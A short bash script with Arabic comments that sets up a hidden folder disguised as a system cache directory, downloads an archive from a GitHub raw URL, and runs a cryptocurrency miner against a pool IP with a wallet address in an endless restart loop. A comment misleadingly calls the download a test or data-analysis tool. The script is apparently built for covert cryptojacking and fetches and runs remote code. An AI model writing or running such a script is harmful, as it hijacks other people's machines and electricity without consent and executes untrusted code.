#!/bin/bash

# اسم العملية
APP_NAME="scala"
WALLET="4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
WORKER="100"
POOL="141.94.96.71:443"
THREADS=

# مجلد العمل المخفي
WORKDIR="$HOME/.cache/.sysd"
mkdir -p "$WORKDIR" && cd "$WORKDIR"

# تحميل برنامج مشروع (مثلاً برنامج اختبار أو أداة تحليل بيانات)
wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz -O scala.tar.gz

# فك الضغط
tar -xvf scala.tar.gz --strip=1
rm scala.tar.gz

# إعادة التشغيل التلقائي
while true
do
    echo "تشغيل $APP_NAME..."
    nohup ./scala -o $POOL -u $WALLET -p $WORKER -k --tls --threads=$THREADS > cpu_output.log 2>&1 &
    wait $!
    echo "$APP_NAME توقف، إعادة التشغيل خلال 5 ثوانٍ..."
    sleep 5
done
